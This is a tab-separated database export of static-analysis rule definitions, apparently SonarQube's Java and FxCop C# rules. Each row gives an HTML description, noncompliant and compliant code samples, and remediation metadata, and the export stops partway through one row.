631	"wait(...)" should be used instead of "Thread.sleep(...)" when a lock is held	S2276	S2276	squid	<p>If <code>Thread.sleep(...)</code> is called when the current thread holds a lock, it could lead to performance, and scalability issues, or even worse to deadlocks because the execution of the thread holding the lock is frozen. It's better to call <code>wait(...)</code> on the monitor object to temporarily release the lock and allow other threads to run.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic void doSomething(){\n  synchronized(monitor) {\n    while(notReady()){\n      Thread.sleep(200);\n    }\n    process();\n  }\n  ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic void doSomething(){\n  synchronized(monitor) {\n    while(notReady()){\n      monitor.wait(200);\n    }\n    process();\n  }\n  ...\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	multi-threading,performance	f	HTML	1511453807171	1511453807171	3
184	CA2103: Review imperative security	ReviewImperativeSecurity	CA2103	fxcop	<h2>Cause</h2>\n<p>\n            A method uses imperative security and might be constructing the permission by using state information or return values that can change as long as the demand is active.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Imperative security uses managed objects to specify permissions and security actions during code execution, compared to declarative security, which uses attributes to store permissions and actions in metadata. Imperative security is very flexible because you can set the state of a permission object and select security actions by using information that is not available until run time. Together with that flexibility comes the risk that the runtime information that you use to determine the state of a permission does not remain unchanged as long as the action is in effect.\n            Use declarative security whenever possible. Declarative demands are easier to understand.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Review the imperative security demands to make sure that the state of the permission does not rely on information that can change as long as the permission is being used.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if the permission does not rely on changing data. However, it is better to change the imperative demand to its declarative equivalent.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182309.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182309.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806538	1511453806539	1
185	CA1017: Mark assemblies with ComVisibleAttribute	MarkAssembliesWithComVisible	CA1017	fxcop	<h2>Cause</h2>\n<p>\n            An assembly does not have the <code>System.Runtime.InteropServices.ComVisibleAttribute</code> attribute applied to it.\n</p>\n<h2>Rule Description</h2>\n<p>\n            The <code>ComVisibleAttribute</code> attribute determines how COM clients access managed code. Good design dictates that assemblies explicitly indicate COM visibility. COM visibility can be set for a whole assembly and then overridden for individual types and type members. If the attribute is not present, the contents of the assembly are visible to COM clients.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, add the attribute to the assembly. If you do not want the assembly to be visible to COM clients, apply the attribute and set its value to <code>false</code>.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule. If you want the assembly to be visible, apply the attribute and set its value to <code>true</code>.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182157.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182157.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806540	1511453806540	1
186	CA1052: Static holder types should be sealed	StaticHolderTypesShouldBeSealed	CA1052	fxcop	<h2>Cause</h2>\n<p>\n            A public or protected type contains only static members and is not declared with the <code>sealed (C# Reference)</code> (NotInheritable (Visual Basic)) modifier.\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule assumes that a type that contains only static members is not designed to be inherited, because the type does not provide any functionality that can be overridden in a derived type. A type that is not meant to be inherited should be marked with the <code>sealed</code> modifier to prohibit its use as a base type.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, mark the type as <code>sealed</code>. If you are targeting .NET Framework 2.0 or earlier, a better approach is to mark the type as <code>static</code>. In this manner, you avoid having to declare a private constructor to prevent the class from being created.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Suppress a warning from this rule only if the type is designed to be inherited. The absence of the <code>sealed</code> modifier suggests that the type is useful as a base type.\n</p>\n<h2>Example of a Violation</h2>\n\n<h3>Description</h3>\n<p>\n                The following example shows a type that violates the rule.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\n\nnamespace DesignLibrary\n{\n    public class StaticMembers\n    {\n        static int someField;\n\n        public static int SomeProperty\n        {\n            get\n            {\n                return someField;\n            }\n            set\n            {\n                someField = value;\n            }\n        }\n\n        StaticMembers() {}\n\n        public static void SomeMethod() {}\n    }\n}\n</pre>\n\n\n\n\n\n</p>\n<h2>Fix with the Static Modifier</h2>\n\n<h3>Description</h3>\n<p>\n                The following example shows how to fix a violation of this rule by marking the type with the <code>static</code> modifier.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\n\nnamespace DesignLibrary\n{\n    public static class StaticMembers\n    {\n        private static int someField;\n\n        public static int SomeProperty\n        {\n            get { return someField; }\n            set { someField = value; }\n        }\n\n        public static void SomeMethod()\n        {\n        }\n\n        public static event SomeDelegate SomeEvent;\n    }\n\n    public delegate void SomeDelegate();\n}\n</pre>\n\n\n\n\n\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:StaticHolderTypesShouldNotHaveConstructors}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182168.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182168.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806541	1511453806542	1
637	Member variable visibility should be specified	S2039	S2039	squid	<p>Failing to explicitly declare the visibility of a member variable could result it in having a visibility you don't expect, and potentially leave it open to unexpected modification by other classes.</p>\n\n<h2>Noncompliant Code Sample</h2>\n<pre>\nclass Ball {\n  String color="red";  // Noncompliant\n}\nenum A {\n B;\n int a;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nclass Ball {\n  private String color="red";  // Compliant\n}\nenum A {\n B;\n private int a;\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807177	1511453807177	3
710	"notifyAll" should be used	S2446	S2446	squid	<code>notify</code> and <code>notifyAll</code> both wake up sleeping threads, but <code>notify</code> only rouses one, while <code>notifyAll</code> rouses all of them. Since <code>notify</code> might not wake up the right thread, <code>notifyAll</code> should be used instead.\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass MyThread extends Thread{\n\n  @Override\n  public void run(){\n    synchronized(this){\n      // ...\n      notify();  // Noncompliant\n    }\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nclass MyThread extends Thread{\n\n  @Override\n  public void run(){\n    synchronized(this){\n      // ...\n      notifyAll();\n    }\n  }\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	multi-threading	f	HTML	1511453807241	1511453807242	2
187	CA2112: Secured types should not expose fields	SecuredTypesShouldNotExposeFields	CA2112	fxcop	<h2>Cause</h2>\n<p>\n            A public or protected type contains public fields and is secured by a Link Demands.\n</p>\n<h2>Rule Description</h2>\n<p>\n            If code has access to an instance of a type that is secured by a link demand, the code does not have to satisfy the link demand to access the type's fields.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, make the fields nonpublic and add public properties or methods that return the field data. LinkDemand security checks on types protect access to the type's properties and methods. However, code access security does not apply to fields.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Both for security issues and for good design, you should fix violations by making the public fields nonpublic. You can suppress a warning from this rule if the field does not hold information that should remain secured, and you do not rely on the contents of the field.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:DoNotDeclareVisibleInstanceFields}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182318.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182318.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	1h	\N	\N	\N	\N	\N	f	HTML	1511453806542	1511453806544	1
188	CA1900: Value type fields should be portable	ValueTypeFieldsShouldBePortable	CA1900	fxcop	<h2>Cause</h2>\n<p>\n            This rule checks that structures that are declared with explicit layout will align correctly when marshaled to unmanaged code on 64-bit operating systems. IA-64 does not allow unaligned memory accesses and the process will crash if this violation is not fixed.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Structures that have explicit layout that contains misaligned fields cause crashes on 64-bit operating systems.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            All fields that are smaller than 8 bytes must have offsets that are a multiple of their size, and fields that are 8 bytes or more must have offsets that are a multiple of 8. Another solution is to use <code>LayoutKind.Sequential</code> instead of <code>LayoutKind.Explicit</code>, if reasonable.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            This warning should be suppressed only if it occurs in error.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182285.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182285.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806545	1511453806545	1
189	CA2231: Overload operator equals on overriding ValueType.Equals	OverloadOperatorEqualsOnOverridingValueTypeEquals	CA2231	fxcop	<h2>Cause</h2>\n<p>\n            A value type overrides <code>Object.Equals</code> but does not implement the equality operator.\n</p>\n<h2>Rule Description</h2>\n<p>\n            In most programming languages there is no default implementation of the equality operator (==) for value types. If your programming language supports operator overloads, you should consider implementing the equality operator. Its behavior should be identical to that of <code>Equals</code>.\n            You cannot use the default equality operator in an overloaded implementation of the equality operator. Doing so will cause a stack overflow. To implement the equality operator, use the Object.Equals method in your implementation. For example:\n\n\n\n\n\n\n\n\n\n            <pre>\nIf (Object.ReferenceEquals(left, Nothing)) Then\n    Return Object.ReferenceEquals(right, Nothing)\nElse\n    Return left.Equals(right)\nEnd If\n</pre>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n            <pre>\nif (Object.ReferenceEquals(left, null))\n    return Object.ReferenceEquals(right, null);\nreturn left.Equals(right);\n</pre>\n\n\n\n\n\n\n\n\n\n\n\n                How to Fix Violations\n\n\n\n\n\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule; however, we recommend that you provide the equality operator if possible.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:DoNotOverloadOperatorEqualsOnReferenceTypes}<br/>\n\n\n\n\n                {rule:fxcop:OperatorOverloadsHaveNamedAlternates}<br/>\n\n\n\n\n                {rule:fxcop:OperatorsShouldHaveSymmetricalOverloads}<br/>\n\n\n\n\n                {rule:fxcop:OverrideEqualsOnOverloadingOperatorEquals}<br/>\n\n\n\n\n                {rule:fxcop:OverrideGetHashCodeOnOverridingEquals}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182359.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182359.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806546	1511453806547	1
190	CA1500: Variable names should not match field names	VariableNamesShouldNotMatchFieldNames	CA1500	fxcop	<h2>Cause</h2>\n<p>\n            An instance method declares a parameter or a local variable whose name matches an instance field of the declaring type. To catch local variables that violate the rule, the tested assembly must be built by using debugging information and the associated program database (.pdb) file must be available.\n</p>\n<h2>Rule Description</h2>\n<p>\n            When the name of an instance field matches a parameter or a local variable name, the instance field is accessed by using the <code>this</code> (<code>Me</code> in Visual Basic) keyword when inside the method body. When maintaining code, it is easy to forget this difference and assume that the parameter/local variable refers to the instance field, which leads to errors. This is true especially for lengthy method bodies.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, rename either the parameter/variable or the field.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182216.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182216.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	\N	\N	\N	f	HTML	1511453806547	1511453806549	1
191	CA1002: Do not expose generic lists	DoNotExposeGenericLists	CA1002	fxcop	<h2>Cause</h2>\n<p>\n            A type contains an externally visible member that is a <code>System.Collections.Generic.List&lt;T&gt;</code> type, returns a <code>System.Collections.Generic.List&lt;T&gt;</code> type, or whose signature includes a <code>System.Collections.Generic.List&lt;T&gt;</code> parameter.\n</p>\n<h2>Rule Description</h2>\n<p>\n\n\n                <code>System.Collections.Generic.List&lt;T&gt;</code>\n               is a generic collection that is designed for performance and not inheritance. <code>System.Collections.Generic.List&lt;T&gt;</code> does not contain virtual members that make it easier to change the behavior of an inherited class. The following generic collections are designed for inheritance and should be exposed instead of <code>System.Collections.Generic.List&lt;T&gt;</code>.\n            <ul>\n              <li>\n\n\n                    System.Collections.ObjectModel.Collection&lt;T&gt;\n\n\n              </li>\n              <li>\n\n\n                    System.Collections.ObjectModel.ReadOnlyCollection&lt;T&gt;\n\n\n              </li>\n              <li>\n\n\n                    System.Collections.ObjectModel.KeyedCollection&lt;TKey, TItem&gt;\n\n\n              </li>\n            </ul>\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, change the <code>System.Collections.Generic.List&lt;T&gt;</code> type to one of the generic collections that is designed for inheritance.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule unless the assembly that raises this warning is not meant to be a reusable library. For example, it would be safe to suppress this warning in a performance tuned application where a performance benefit was gained from the use of generic lists.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:AvoidExcessiveParametersOnGenericTypes}<br/>\n\n\n\n\n                {rule:fxcop:CollectionsShouldImplementGenericInterface}<br/>\n\n\n\n\n                {rule:fxcop:DoNotDeclareStaticMembersOnGenericTypes}<br/>\n\n\n\n\n                {rule:fxcop:DoNotNestGenericTypesInMemberSignatures}<br/>\n\n\n\n\n                {rule:fxcop:GenericMethodsShouldProvideTypeParameter}<br/>\n\n\n\n\n                {rule:fxcop:UseGenericEventHandlerInstances}<br/>\n\n\n\n\n                {rule:fxcop:UseGenericsWhereAppropriate}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182142.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182142.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806550	1511453806550	1
192	CA2217: Do not mark enums with FlagsAttribute	DoNotMarkEnumsWithFlags	CA2217	fxcop	<h2>Cause</h2>\n<p>\n            An externally visible enumeration is marked with <code>FlagsAttribute</code> and it has one or more values that are not powers of two or a combination of the other defined values on the enumeration.\n</p>\n<h2>Rule Description</h2>\n<p>\n            An enumeration should have <code>FlagsAttribute</code> present only if each value defined in the enumeration is a power of two, or a combination of defined values.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, remove <code>FlagsAttribute</code> from the enumeration.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:MarkEnumsWithFlags}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182335.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182335.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806551	1511453806551	1
193	CA1011: Consider passing base types as parameters	ConsiderPassingBaseTypesAsParameters	CA1011	fxcop	<h2>Cause</h2>\n<p>\n            A method declaration includes a formal parameter that is a derived type, and the method calls only members of the base type of the parameter.\n</p>\n<h2>Rule Description</h2>\n<p>\n            When a base type is specified as a parameter in a method declaration, any type that is derived from the base type can be passed as the corresponding argument to the method. When the argument is used inside the method body, the specific method that is executed depends on the type of the argument. If the additional functionality that is provided by the derived type is not required, use of the base type allows wider use of the method.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, change the type of the parameter to its base type.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule\n            <ul>\n              <li>\n                if the method requires the specific functionality that is provided by the derived type\n                - or -\n              </li>\n              <li>\n                to enforce that only the derived type, or a more derived type, is passed to the method.\n              </li>\n            </ul>\n            In these cases, the code will be more robust because of the strong type checking that is provided by the compiler and runtime.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:MembersShouldNotExposeCertainConcreteTypes}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/3hk32yyz.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/3hk32yyz.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806552	1511453806553	1
194	CA1824: Mark assemblies with NeutralResourcesLanguageAttribute	MarkAssembliesWithNeutralResourcesLanguage	CA1824	fxcop	<h2>Cause</h2>\n<p>\n            An assembly contains a ResX-based resource but does not have the <code>System.Resources.NeutralResourcesLanguageAttribute</code> applied to it.\n</p>\n<h2>Rule Description</h2>\n<p>\n            The NeutralResourcesLanguage attribute informs the ResourceManager of the language that was used to display the resources of the neutral culture for an assembly. When it looks up resources in the same culture as the neutral resources language, the ResourceManager automatically uses the resources that are located in the main assembly. It does this instead of searching for a satellite assembly that has the current user interface culture for the current thread. This improves lookup performance for the first resource that you load and can reduce your working set.\n</p>\n<h2>Fixing Violations</h2>\n<p>\n            To fix a violation of this rule, add the attribute to the assembly, and specify the language of the resources of the neutral culture.\n</p>\n<h2>Specifying the Language</h2>\n<p>\n            To specify the language of the resource of the neutral culture\n\n\n                <li>\n                  In Solution Explorer, right-click your project, and then Click Properties.\n                </li>\n                <li>\n                  From the left navigation bar select Application, and then click Assembly Information.\n                </li>\n                <li>\n                  In the Assembly Information dialog box, select the language from the Neutral Language drop-down list.\n                </li>\n                <li>\n                  Click OK.\n                </li>\n\n\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is permissible to suppress a warning from this rule. However, startup performance might decrease.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/bb385967.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb385967.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806554	1511453806554	1
195	CA2123: Override link demands should be identical to base	OverrideLinkDemandsShouldBeIdenticalToBase	CA2123	fxcop	<h2>Cause</h2>\n<p>\n            A public or protected method in a public type overrides a method or implements an interface, and does not have the same Link Demands as the interface or virtual method.\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule matches a method to its base method, which is either an interface or a virtual method in another type, and then compares the link demands on each. A violation is reported if either the method or the base method has a link demand and the other does not.\n            If this rule is violated, a malicious caller can bypass the link demand merely by calling the unsecured method.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, apply the same link demand to the overide method or implementation. If this is not possible, mark the method with a full demand or remove the attribute altogether.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182305.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182305.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806555	1511453806555	1
196	CA1016: Mark assemblies with AssemblyVersionAttribute	MarkAssembliesWithAssemblyVersion	CA1016	fxcop	<h2>Cause</h2>\n<p>\n            The assembly does not have a version number.\n</p>\n<h2>Rule Description</h2>\n<p>\n            The identity of an assembly is composed of the following information:\n            <ul>\n              <li>\n                Assembly name\n              </li>\n              <li>\n                Version number\n              </li>\n              <li>\n                Culture\n              </li>\n              <li>\n                Public key (for strongly named assemblies).\n              </li>\n            </ul>\n            The .NET Framework uses the version number to uniquely identify an assembly, and to bind to types in strongly named assemblies. The version number is used together with version and publisher policy. By default, applications run only with the assembly version with which they were built.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, add a version number to the assembly by using the <code>System.Reflection.AssemblyVersionAttribute</code> attribute. See the following example.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule for assemblies that are used by third parties, or in a production environment.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182155.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182155.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806566	1511453806567	1
204	CA2151: Fields with critical types should be security critical	CA2151	CA2151	fxcop	<h2>Cause</h2>\n<p>\n            A security transparent field or a safe critical field is declared. Its type is specified as security critical. For example:\n\n\n\n\n\n\n\n\n\n            <pre>\n[assembly: AllowPartiallyTrustedCallers]\n\n   [SecurityCritical]\n   class Type1 { } // Security Critical type\n\n   class Type2 // Security transparent type\n   {\n      Type1 m_field; // CA2151, transparent field of critical type\n   }\n</pre>\n\n\n\n\nIn this example, m_field is a security transparent field of a type that is security critical.\n\n\n\n\n\n\n                Rule Description\n\n\n\n\n\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, mark the field with the <code>SecurityCriticalAttribute</code> attribute, or make the type that is referenced by the field eith security transparent or safe critical.\n\n\n\n\n\n\n\n\n\n            <pre>\n// Fix 1: Make the referencing field security critical\n[assembly: AllowPartiallyTrustedCallers]\n\n   [SecurityCritical]\n   class Type1 { } // Security Critical type\n\n   class Type2 // Security transparent type\n   {\n      [SecurityCritical]\n      Type1 m_field; // Fixed: critical type, critical field\n   }\n\n// Fix 2: Make the referencing field security critical\n[assembly: AllowPartiallyTrustedCallers]\n\n\n   class Type1 { } // Type1 is now transparent\n\n   class Type2 // Security transparent type\n   {\n      [SecurityCritical]\n      Type1 m_field; // Fixed: critical type, critical field\n   }\n</pre>\n\n\n\n\n\n\n\n\n\n\n\n                When to Suppress Warnings\n\n\n\n\n\n</p>\n<h2>Code</h2>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\nusing System.Runtime.InteropServices;\nusing System.Security;\n\nnamespace TransparencyWarningsDemo\n{\n\n    public class SafeNativeMethods\n    {\n        // CA2145 violation - transparent method marked SuppressUnmanagedCodeSecurity.  This should be fixed by \n        // marking this method SecurityCritical.\n        [DllImport("kernel32.dll", SetLastError = true)]\n        [SuppressUnmanagedCodeSecurity]\n        [return: MarshalAs(UnmanagedType.Bool)]\n        internal static extern bool Beep(uint dwFreq, uint dwDuration);\n    }\n}\n</pre>\n\n\n\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/dn621098.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dn621098.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	f	HTML	1511453806582	1511453806582	1
197	CA2002: Do not lock on objects with weak identity	DoNotLockOnObjectsWithWeakIdentity	CA2002	fxcop	<h2>Cause</h2>\n<p>\n            A thread attempts to acquire a lock on an object that has a weak identity.\n</p>\n<h2>Rule Description</h2>\n<p>\n            An object is said to have a weak identity when it can be directly accessed across application domain boundaries. A thread that tries to acquire a lock on an object that has a weak identity can be blocked by a second thread in a different application domain that has a lock on the same object. The following types have a weak identity and are flagged by the rule:\n            <ul>\n              <li>\n\n\n                    <code>MarshalByRefObject</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>ExecutionEngineException</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>OutOfMemoryException</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>StackOverflowException</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>String</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>MemberInfo</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>ParameterInfo</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>Thread</code>\n\n\n              </li>\n            </ul>\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, use an object from a type that is not in the list in the Description section.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:DisposableFieldsShouldBeDisposed}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182290.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182290.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	15min	\N	\N	\N	\N	\N	f	HTML	1511453806568	1511453806568	1
198	CA2226: Operators should have symmetrical overloads	OperatorsShouldHaveSymmetricalOverloads	CA2226	fxcop	<h2>Cause</h2>\n<p>\n            A type implements the equality or inequality operator and does not implement the opposite operator.\n</p>\n<h2>Rule Description</h2>\n<p>\n            There are no circumstances where either equality or inequality is applicable to instances of a type, and the opposite operator is undefined. Types typically implement the inequality operator by returning the negated value of the equality operator.\n            The C# compiler issues an error for violations of this rule.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, implement both the equality and inequality operators, or remove the one that is present.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule. Your type will not work in a manner that is consistent with the .NET Framework.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:DoNotOverloadOperatorEqualsOnReferenceTypes}<br/>\n\n\n\n\n                {rule:fxcop:OperatorOverloadsHaveNamedAlternates}<br/>\n\n\n\n\n                {rule:fxcop:OverrideEqualsOnOverloadingOperatorEquals}<br/>\n\n\n\n\n                {rule:fxcop:OverrideGetHashCodeOnOverridingEquals}<br/>\n\n\n\n\n                {rule:fxcop:OverloadOperatorEqualsOnOverridingValueTypeEquals}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182356.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182356.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806570	1511453806572	1
667	"deleteOnExit" should not be used	CallToFileDeleteOnExitMethod	CallToFileDeleteOnExitMethod	squid	<p>Use of <code>File.deleteOnExit()</code> is not recommended for the following reasons:</p>\n<ul>\n<li> The deletion occurs only in the case of a normal JVM shutdown but not when the JVM crashes or is killed.</li>\n<li> For each file handler, the memory associated to the handler is released only at the end of the process.</li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nFile file = new File("file.txt");\nfile.deleteOnExit();  // Noncompliant\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	performance	f	HTML	1511453807203	1511453807204	1
668	Threads should not be started in constructors	S2693	S2693	squid	<p>The problem with invoking <code>Thread.start()</code> in a constructor is that you'll have a confusing mess on your hands if the class is ever extended because the superclass' constructor will start the thread before the child class has truly been initialized.</p>\n\n<p>This rule raises an issue any time <code>start</code> is invoked in the constructor of a non-<code>final</code> class.</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic class MyClass {\n\n  Thread thread = null;\n\n  public MyClass(Runnable runnable) {\n    thread = new Thread(runnable);\n    thread.start(); // Noncompliant\n  }\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	multi-threading,pitfall	f	HTML	1511453807204	1511453807204	1
199	CA1007: Use generics where appropriate	UseGenericsWhereAppropriate	CA1007	fxcop	<h2>Cause</h2>\n<p>\n            An externally visible method contains a reference parameter of type <code>System.Object</code>, and the containing assembly targets .NET Framework 2.0.\n</p>\n<h2>Rule Description</h2>\n<p>\n            A reference parameter is a parameter that is modified by using the <code>ref</code> (<code>ByRef</code> in Visual Basic) keyword. The argument type that is supplied for a reference parameter must exactly match the reference parameter type. To use a type that is derived from the reference parameter type, the type must first be cast and assigned to a variable of the reference parameter type. Use of a generic method allows all types, subject to constraints, to be passed to the method without first casting the type to the reference parameter type.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, make the method generic and replace the <code>Object</code> parameter by using a type parameter.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:AvoidExcessiveParametersOnGenericTypes}<br/>\n\n\n\n\n                {rule:fxcop:CollectionsShouldImplementGenericInterface}<br/>\n\n\n\n\n                {rule:fxcop:DoNotDeclareStaticMembersOnGenericTypes}<br/>\n\n\n\n\n                {rule:fxcop:DoNotExposeGenericLists}<br/>\n\n\n\n\n                